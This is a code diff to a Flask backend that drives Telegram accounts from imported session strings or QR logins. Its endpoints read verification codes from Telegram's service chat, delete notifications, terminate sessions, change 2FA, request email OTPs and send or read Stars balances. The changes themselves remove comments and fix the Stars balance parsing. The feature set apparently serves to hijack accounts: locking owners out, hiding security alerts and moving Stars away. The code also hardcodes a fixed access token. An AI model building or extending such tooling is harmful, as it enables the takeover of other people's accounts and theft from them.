@@ -40,14 +40,12 @@ qr_store = {}
 def check_auth(req):
     return req.headers.get("Authorization") == "secure_token_noobster"
 
-# ---------- persistent loop ----------
 _loop = asyncio.new_event_loop()
 threading.Thread(target=_loop.run_forever, daemon=True).start()
 
 def run_async(coro):
     return asyncio.run_coroutine_threadsafe(coro, _loop).result()
 
-# ---------- auth ----------
 @app.route('/api/auth', methods=['POST'])
 def auth():
     data = request.json or {}
@@ -55,7 +53,6 @@ def auth():
         return jsonify({"success": True, "token": "secure_token_noobster"})
     return jsonify({"error": "Invalid Key"}), 401
 
-# ---------- logins ----------
 async def login_pyrogram(session_str, api_id, api_hash):
     from pyrogram import Client as PyroClient
     client = PyroClient(":memory:", api_id=api_id, api_hash=api_hash,
@@ -119,7 +116,6 @@ def add_account():
     except Exception as e:
         return jsonify({"error": f"Login failed: {str(e)}"}), 500
 
-# ---------- QR login ----------
 @app.route('/api/qr-start', methods=['POST'])
 def qr_start():
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -184,7 +180,6 @@ def qr_poll(qr_id):
         return jsonify({"status": "expired"})
     return jsonify({"status": "pending"})
 
-# ---------- accounts ----------
 @app.route('/api/accounts', methods=['GET'])
 def get_accounts():
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -207,7 +202,6 @@ def get_chats(acc_id):
     return jsonify([{"id": "777000", "name": "Telegram (Notification Bot)",
                      "lastMsg": "Verification codes and service updates"}])
 
-# ---------- messages ----------
 @app.route('/api/messages/<acc_id>/<chat_id>', methods=['GET'])
 def get_messages(acc_id, chat_id):
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -256,7 +250,7 @@ def delete_notification():
         return jsonify(out), 500
     return jsonify(out)
 
-# ---------- stars ----------
+# ---------- Stars balance FIXED ----------
 @app.route('/api/stars/<acc_id>', methods=['GET'])
 def get_stars(acc_id):
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -268,10 +262,13 @@ def get_stars(acc_id):
     async def _get():
         try:
             res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
-            bal = getattr(res.balance, 'amount', None)
-            if bal is None:
-                bal = getattr(res, 'balance', 0)
-            return {"balance": int(bal) if bal else 0}
+            # res.balance is StarsAmount object, .amount is the integer
+            bal_obj = getattr(res, 'balance', None)
+            if bal_obj is not None:
+                bal = getattr(bal_obj, 'amount', 0)
+            else:
+                bal = 0
+            return {"balance": int(bal)}
         except Exception as e:
             return {"error": str(e)}
 
@@ -280,6 +277,7 @@ def get_stars(acc_id):
         return jsonify(out), 500
     return jsonify(out)
 
+# ---------- Send Stars gift FIXED ----------
 @app.route('/api/send-stars', methods=['POST'])
 def send_stars():
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -315,7 +313,6 @@ def send_stars():
         return jsonify(out), 500
     return jsonify(out)
 
-# ---------- deep link resolve ----------
 async def _resolve_channel_link(client, entity):
     username = getattr(entity, "username", None)
     if not username:
@@ -342,7 +339,6 @@ async def _resolve_channel_link(client, entity):
     except Exception: pass
     return username, None
 
-# ---------- profile ----------
 @app.route('/api/profile/<acc_id>', methods=['GET'])
 def get_profile(acc_id):
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -424,7 +420,6 @@ def get_profile(acc_id):
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-# ---------- terminate ----------
 @app.route('/api/terminate', methods=['POST'])
 def terminate_sessions():
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -465,7 +460,6 @@ def terminate_sessions():
         del accounts[acc_id]
     return jsonify({"success": True, "message": f"Terminated {val} session(s)."})
 
-# ---------- 2FA ----------
 @app.route('/api/change-2fa', methods=['POST'])
 def change_2fa():
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -494,7 +488,6 @@ def change_2fa():
         return jsonify({"success": True, "message": "2FA password changed."})
     return jsonify({"error": result}), 500
 
-# ---------- email ----------
 @app.route('/api/request-email-otp', methods=['POST'])
 def request_email_otp():
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
